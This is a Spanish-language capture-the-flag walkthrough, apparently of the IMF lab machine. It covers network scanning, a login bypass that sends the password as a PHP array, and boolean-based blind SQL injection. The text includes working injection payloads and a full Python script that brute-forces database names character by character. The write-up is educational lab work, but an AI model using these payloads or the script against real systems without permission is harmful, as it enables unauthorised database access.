### Tags: `SQLI` `REC` `BufferOverflow`

# Reconocimiento (`Linux`)

- Lo primero que hacemos es un **escaneo de equipos** que estén conectados ami red de esta forma:

```ruby
arp-scan -I eth0 --localnet
```

![image](https://github.com/user-attachments/assets/ccac24ad-4eac-420f-aca8-5e2e0767c00d)

# Escaneo (**80**)

```css
sudo nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn <IP>
```

![image](https://github.com/user-attachments/assets/4f4b8e09-b5df-480f-b858-2f9ee6337f6a)

```css
sudo nmap -p80 -sCV <IP> -oN escaneo  
```

![image](https://github.com/user-attachments/assets/fcaa1281-32b9-48fc-b9f4-ac450e9d5959)

# Port 80

- Navegando por la web hicimos un `control + u` y observamos un doble ``==``  que nos llamo la atención  y vemos que estaba en **base64**, lo cual vamos decodificar

![image](https://github.com/user-attachments/assets/60c94905-ca6b-46b8-b1b5-390ac5be5115)

- Lo decodificamos y vemos que **nos dá otra cadena en base64**, lo volvemos a decodificar y nos da una **ruta** que vamos a poner en la web

![image](https://github.com/user-attachments/assets/adb0010e-9595-4a60-a7d9-9dc6815b7c39)
![image](https://github.com/user-attachments/assets/0b46ff27-5876-4a25-8b68-b24eb6b19c15)

Tenemos un panel de login

![image](https://github.com/user-attachments/assets/f48e48b6-8658-4bc4-a84a-b492d40fc784)

Si vamos a la web principal en la parte de **Contact Us** tenemos posibles usuarios la cual vamos a probar en el panel

![image](https://github.com/user-attachments/assets/46bb2956-1b45-427d-8fc7-3a64be4afd97)

# BurpSuite

- El único que funciona es `rmichaels` ya que nos dice **invalid password** y en los otros users nos dice **invalid username**
	- Por ende lo que vamos a hacer es interceptar con Burp la petición

![image](https://github.com/user-attachments/assets/96280361-4028-4e0b-b60c-2239130dff7c)

- Para burlar la contraseña podemos representar un **array** para que devuelva un NULL y se se emplea un **strcompare** nos va da devolver un exitoso por ende considera que lo que pusimos es **correcto**
	- Y vemos que si, que funcionó.

![image](https://github.com/user-attachments/assets/d92f2a05-d958-48ca-94b6-adbe23a26d39)

Vemos que la **flag3** dice que continuemos con el CMS del link 

![image](https://github.com/user-attachments/assets/e32d9512-ef2b-4af2-b367-09a18a15f23f)
![image](https://github.com/user-attachments/assets/4088757e-0a9c-4232-8ac7-7402b7b0c23d)

Dentro del link tenemos esto:

![image](https://github.com/user-attachments/assets/32ad07b0-bb52-41d5-b5e7-8670ec7c20d9)

- Probamos hacer un **LFI** pero no funcionó, pero ponemos un comilla nos **salta un error** lo cual es curioso
	- Por ende otra ves vamos a usar Burp

![image](https://github.com/user-attachments/assets/4d1f44f9-7b64-4388-bb93-cad7d65c055f)

# SQLI *Boolean* Based *Blind*

- Si hacemos un `'or '1'='1-- -` vemos que cambia la respuesta 
	- Entonces lo que vamos a hacer es jugar con condiciones booleanas, si algo devuelve **TRUE exitoso**, devuelve un output, si no es correcto cambia el output

![image](https://github.com/user-attachments/assets/a5ebb031-fa20-43b9-9258-f172e00e385a)

- Ahora lo que hacemos es probar si la base de datos `mysql` que siempre esta existe, jugando `limit` para que nos de una única base de datos.
	- Si la igualdad es correcta (si mysql está en la segunda base de datos,) veremos el la respuesta **Welcome to the IMF Administration.**

![image](https://github.com/user-attachments/assets/fe45d776-4972-422b-9016-d32bc8bc0542)

Para comprobar si la primera base de datos era **information_schema** y vemos que sí

![image](https://github.com/user-attachments/assets/416d7d56-ad85-49d6-857c-f446d35568e1)

# Python Scripting

- Vamos a hacernos un script en Python para fuzear carácter por carácter y obtener el nombre de la base de datos.

### Cuantas Bases de Datos hay

- Con este comando podemos observar cuantas bases de datos hay y vemos que son 5 porque cuando lo igualamos a 5 nos sale el mensajito **Welcome to the IMF Administration.**
	- `' or (select count(schema_name) from information_schema.schemata)='5 `  (poner Ctrl+u para urlenconded)

```python
#!/usr/bin/python3

from pwn import *   #Para poder jugar con barras de progresos
import requests     #Para hacer peticiones HTTP
import string       #Para generar los caracteres de la contraseña
import time         #Para poder hacer sleep
import sys          #Para poder usar sys.exit()
import pdb          #Para poder hacer debugging
import signal       #Para hacer CTRL+C 



def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)



#Variables globales
main_url = "http://192.168.0.192/imfadministrator/cms.php?pagename=home"   #La peticion se tramita por GET
characters = string.ascii_lowercase + '-_'    #string.punctuation  #Abarca todo los simbolos el punctuation


def makeRequest():

    cookies = {"PHPSESSID": "hq7ejo76tsdk4prr3kdn9lsvm1"}   #Cookie de la sesion

    database = ""


    #Barras de Progreso
    p1 = log.progress("Fuerza Bruta")  
    p1.status("Iniciando proceso de fuerza bruta...")    #Para poder ver el mensaje de la barra de progreso
    time.sleep(2)   #Para poder hacer sleep

    p2 = log.progress("Databases")



    for dbs in range(0, 5): #porque hay 5 bases de datos 
        for position_character in range(1, 30):   #suponemos que la base de datos tiene 30 caracteres o menos
            for character in characters:
                sqli = main_url + f"'+and+(select+substring(schema_name,{position_character},1)+from+information_schema.schemata+limit+{dbs},1)='{character}"

                #p1.satatus(sqli)   #si quiero ver como se tramita para cada posicion y cada caracter

                r = requests.get(sqli, cookies=cookies)  #para poder ver la respuesta de la peticion

                if "Welcome to the IMF Administration" in r.text:
                    database += character
                    p2.status(database)  #jugamos con esta barra de progreso para que me muestre los datos de la base de datos
                    break

        database += ","


if __name__ == '__main__':
    makeRequest()

```

- Vemos que nos sacó una base de datos llamada `admin` que parece interesante

![image](https://github.com/user-attachments/assets/9df7e65a-8c90-4bb0-863d-15976b813594)

































